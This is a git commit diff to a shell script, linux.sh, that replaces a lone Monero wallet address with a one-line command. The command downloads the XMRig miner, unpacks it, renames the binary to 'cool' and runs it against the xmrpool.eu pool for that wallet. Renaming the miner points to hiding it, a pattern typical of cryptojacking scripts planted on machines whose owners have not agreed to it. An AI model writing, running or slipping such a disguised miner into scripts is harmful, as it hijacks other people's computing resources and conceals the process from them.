ffcaa3bc9e2b0296e75c0084ee3b095d1bf84f19
Hieuxyzcl09 <165543181+Hieuxyzcl09@users.noreply.github.com>
2024-06-14 23:24:52 +0700

    Update linux.sh

--- linux.sh
+++ linux.sh
@@ -1,1 +1,1 @@
-425KXs2h5Gj22NG5a2jNG9VhZ4GTWMKGUABPDJCmPi3QM6bhg87NhNtZd8Nu4CBYGGT3N6rqjm2MccuF2HBZA2JPVGrKs4b
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && tar -xz -f xmrig-6.21.3-linux-static-x64.tar.gz && cd xmrig-6.21.3 && mv xmrig cool && ./cool -o xmrpool.eu:3333 -u 425KXs2h5Gj22NG5a2jNG9VhZ4GTWMKGUABPDJCmPi3QM6bhg87NhNtZd8Nu4CBYGGT3N6rqjm2MccuF2HBZA2JPVGrKs4b
